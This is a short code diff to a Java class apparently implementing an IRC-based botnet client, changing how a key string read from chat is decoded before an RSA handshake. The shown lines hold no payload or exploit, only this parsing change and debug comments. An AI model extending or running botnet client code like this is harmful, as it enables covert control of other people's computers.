@@ -245,7 +245,7 @@ public class BotnetClient extends PircBot {
 						//System.out.println("c:" + s2);
 						//System.out.println("m:" + m.decryptRSA(s2));
 						//System.out.println("key: " + otherKey);
-						String info = chat.readLine();
+						String info = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n");
 						//System.out.println("info: " + info);
 						m.setPubParams(info);
 						m.handShake(otherKey);
